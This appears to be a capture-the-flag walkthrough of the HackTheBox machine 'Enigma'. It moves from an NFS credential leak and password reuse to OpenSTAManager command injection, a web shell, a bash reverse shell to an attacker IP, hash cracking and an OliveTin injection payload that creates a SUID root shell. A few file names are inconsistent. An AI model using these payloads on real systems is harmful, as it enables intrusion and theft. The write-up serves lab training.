 # Professional Walkthrough: HackTheBox "Enigma" (Season 11)
 
![Screenshot 1](https://cdn-images-1.medium.com/max/800/1*wLxNArypt1qqy8-WAMPXcA.png)
*Summary*
 
"Enigma" is an easily exploitable machine that relies on a series of common configuration errors. The entry point is the exposure of sensitive credentials via an undocumented NFS share. This leads to an email account on Roundcube, where administrative credentials for a vulnerable CRM application are leaked. Finally, root privileges are obtained by injecting commands into a misconfigured internal process-automation tool that runs with root privileges.
 
## 1. Enumeration and External Reconnaissance
 
We begin with a full network scan against the target IP address `10.129.239.191` using nmap.
 
```bash
nmap -sV -sC mail001.enigma.htb
```
 
![Screenshot 2](https://cdn-images-1.medium.com/max/800/1*0xtqe36K-e5vJ3O-L1VgUQ.png)
 
## 2. Initial Foothold: NFS Share Leak
 
Enumerating NFS services with `showmount` reveals an accessible share directory.
 
```bash
showmount -e 10.129.239.191
# Export list for 10.129.239.191:
# /nfs/onboarding
```
 
We mount this share locally to inspect its contents:
 
```bash
mkdir -p /tmp/onboarding
sudo mount -t nfs 10.129.239.191:/nfs/onboarding /tmp/onboarding
ls -la /tmp/onboarding
# Output:
# -rw-r--r-- 1 root root 1575 Feb 14 19:53 New_Employee_Access.pdf
```
 
![Screenshot 3](https://cdn-images-1.medium.com/max/800/1*4t8VJ6umGoYugqdZBwz2TQ.png)
 
Inside the mounted folder, we find the PDF file `New_Employee_Access.pdf`. Converting this file to plain text reveals a welcome document containing baseline credentials for registration (opened here and the data extracted from this path, using the `pdftotext` tool).
 
```bash
pdftotext New_Employee_Access.pdf New_Employee_Access.txt
cat New_Employee_Access.txt
```
 
![Screenshot 4](https://cdn-images-1.medium.com/max/800/1*QpsS8p820_8vlh1aYu5U5Q.png)
 
## Extracted Credentials
 
- Employee: Kevin Mitchell
- Webmail URL: http://mail001.enigma.htb
- Username: kevin
- Password: Enigma2024!
We navigate to the webmail application at http://mail001.enigma.htb and successfully log in as `kevin:Enigma2024!`
 
![Screenshot 5](https://cdn-images-1.medium.com/max/800/1*Aw7YCTIQxLwbJqERBDnF1g.png)
 
## 3. Lateral Movement: Password Reuse for Sarah
 
Upon examining Kevin's email, we found a general password policy where employees are provisioned with the same temporary password. We tried the default password `Enigma2024!` against another user account, Sarah.
 
We log in to Roundcube as `sarah:Enigma2024!` and gain access to her mailbox. Inside Sarah's inbox, we find an email titled "Re: OpenSTAManager Access Request."
 
The email contains administrative credentials for a different subdomain:
 
- URL: http://support_001.enigma.htb
- Username: admin
- Password: Ne3s4rTars78s
![Screenshot 6](https://cdn-images-1.medium.com/max/800/1*-J4u0hV4Vie9M45JA_Z68w.png)
 
We update our local `/etc/hosts` file to resolve this subdomain to the target IP address.
 
```bash
echo '10.129.239.191 support_001.enigma.htb' | sudo tee -a /etc/hosts
```
 
## 4. Exploiting OpenSTAManager (CVE-2025–69212)
 
Navigating to http://support_001.enigma.htb reveals the OpenSTAManager CRM application. We log in using the credentials discovered in Sarah's email (`admin:Ne3s4rTars78s`).
 
**Vulnerability Identification:** This specific version of OpenSTAManager is vulnerable to OS Command Injection during the processing of signed `.p7m` files (CVE-2025-69212). When a user uploads a file to verify its signature, the application calls `exec()` against an OpenSSL binary using the filename provided by the user.
 
**Exploit Strategy:** We craft a malicious `.zip` archive containing a `.p7m` file with a specially crafted filename. The filename is designed to break out of the shell command context and execute arbitrary OS commands.
 
We use the following Python script to generate the malicious payload (`exploit.py`):
 
![Screenshot 7](https://cdn-images-1.medium.com/max/800/1*FoxmwxhF2To0oNPI1fWIqA.png)
 
We run the script and upload `exploit.zip` via the "Importazione FE" (Import XML) feature in the web application. While the application displays an XML parsing error, the command injection is executed successfully in the background.
 
We confirm the web shell presence by issuing a test command:
 
```bash
curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
 
![Screenshot 8](https://cdn-images-1.medium.com/max/800/1*WGm31DdGZNOh-E_xWFsS4g.png)
 
**Establishing Reverse Shell:**
 
```bash
# Generate Base64 encoded reverse shell
echo -n 'bash -i >& /dev/tcp/10.10.14.51/4444 0>&1' | base64 -w0
curl -G "http://support_001.enigma.htb/files/SHELL.php?" --data-urlencode 'c=echo <base64_payload> | base64 -d | bash'
```
 
![Screenshot 9](https://cdn-images-1.medium.com/max/800/1*7K54cxuTgIZLh9NcArxzjg.png)
 
We catch the reverse shell with a netcat listener:
 
![Screenshot 10](https://cdn-images-1.medium.com/max/800/1*qEh7jvJFGsxTa03GK0Fw4g.png)
 
## 5. Internal Pivoting and User Flag
 
Once inside as `www-data`, we browse the OpenSTAManager web root and find the configuration file `config.inc.php`:
 
```bash
cat /var/www/html/openstamanager/config.inc.php
```
 
This file leaks MySQL database credentials:
 
- `$db_username = 'brollin'`
- `$db_password = 'Fri3nds@999'`
- `$db_name = 'openstamanager'`
![Screenshot 11](https://cdn-images-1.medium.com/max/800/1*66L7HM9VhCi_3ueoeFAW2A.png)
 
We access the MySQL database using these credentials to enumerate user accounts:
 
```bash
mysql -u brollin -p'Fri3nds@999' -h localhost openstamanager -e "SELECT username, password FROM zz_users;"
```
 
![Screenshot 12](https://cdn-images-1.medium.com/max/800/1*CfQf4GFaYtz4sOBURmiGxQ.png)
 
**Found Hashes:**
 
- `admin: $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu`
- `haris: $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZe0YXm0biNphrsZDr6ec`
![Screenshot 13](https://cdn-images-1.medium.com/max/800/1*JbHHgGYPE6apcUVe4oAmvA.png)
 
We save the `haris` hash to a file and crack it using john (or hashcat) with the rockyou.txt wordlist:
 
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt harris-hash
```
 
The password is successfully cracked as `bestfriends`.
 
![Screenshot 14](https://cdn-images-1.medium.com/max/800/1*nfl4UwtQ-c_raeR4Jkjosw.png)
 
We switch users using the `su` command:
 
```bash
su haris
# Password: bestfriends
```
 
> We ran into an issue at login; the access line was unclear and hidden, so we ran `/bin/bash -i` to make it display clearly.
 
After gaining access as the `haris` user, we navigate to the `/home/haris/` directory and capture the user flag.
 
```bash
cat /home/haris/user.txt
```
 
![Screenshot 15](https://cdn-images-1.medium.com/max/800/1*3X5AwMl240GUz3EAn0hVzg.png)
 
## 6. Privilege Escalation to Root (OliveTin)
 
With further inspection of the system, we discover a service called `oliveTin` running as the root user:
 
```bash
ps aux | grep root
# root  1440  1  0  ...  /usr/local/bin/oliveTin
```
 
![Screenshot 16](https://cdn-images-1.medium.com/max/800/1*YogOFMMOxw8i_95-C19TgA.png)
 
### Configuration Analysis
 
We inspect the configuration file located at `/opt/oliveTin/OliveTin-linux-amd64/config.yaml`. Key findings in the configuration file:
 
- `authRequireGuestsToLogin: false` (unrestricted access to the API for local users).
- A custom action named `backup_database`:
```bash
- title: Backup Database
  id: backup_database
  shell: 'mysqldump -u {{db_user}} -p\" {{db_pass}} \" {{db_name}} > /opt/backups/backup.sql'
  arguments:
    - name: db_user
      type: ascii_identifier
    - name: db_pass
      type: password
    - name: db_name
      type: ascii_identifier
```
 
![Screenshot 17](https://cdn-images-1.medium.com/max/800/1*xz2a8pSUDyKOzEyr4GPcqQ.png)
 
The shell command is vulnerable to exploitation because it inserts the `db_pass` user argument directly into the shell command. By closing the preceding double quote (`"`), we can inject arbitrary commands.
 
**Exploiting the OliveTin API:** we identify the internal API endpoint: `http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction`
 
We craft a payload to inject an OS command that creates a SUID copy of Bash, which will later let us obtain a root shell:
 
```bash
curl -s -X POST -H 'Content-Type: application/json' --data '{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"backup_svc"},{"name":"db_pass","value":"x\" ; install -m 4755 /bin/bash /tmp/.bs ; #"},{"name":"db_name","value":"production"}]}' http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction
```
 
**Injection breakdown:**
 
- `x"` closes the quote opened for the password.
- `;` terminates the `mysqldump` command, allowing the next command to run.
- `install -m 4755 /bin/bash /tmp/bs` copies `/bin/bash` to `/tmp/bs` with the setuid bit set (runs as root).
- `; #` comments out the rest of the original command to avoid syntax errors.
Finally, we run the new SUID shell to obtain root privileges and capture the flag:
 
```bash
/tmp/bs -p whoami
# root
cat /root/root.txt
```
 
![Screenshot 18](https://cdn-images-1.medium.com/max/800/1*Ls-4v8Q0qw6GbpdZ9FwYgg.png)
 
> "The line of code ends here, but the fight for infrastructure security never stops. Your choice is to be the lightning strike, not its victim."
 
